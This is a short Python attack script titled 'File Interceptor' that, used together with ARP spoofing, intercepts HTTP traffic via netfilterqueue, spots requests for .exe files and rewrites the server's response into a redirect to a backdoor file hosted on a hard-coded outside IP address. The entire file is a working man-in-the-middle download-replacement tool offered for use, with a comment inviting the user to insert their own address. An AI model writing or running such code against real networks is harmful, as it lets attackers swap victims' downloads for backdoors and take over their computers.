#! usr/env python

import scapy.all as scapy
import netfilterqueue
import os
import pyfiglet

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "rarlab" not in scapy_packet[scapy.Raw].load:
                print("[+] EXE request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://93.31.82.227:8888/Python/Backdoor.py\n\n" #Put the address you want
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()


ascii_banner = pyfiglet.figlet_format("File Interceptor\n By Zeckers")
print(ascii_banner)
print("[+] Use the ARPSpoofer")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

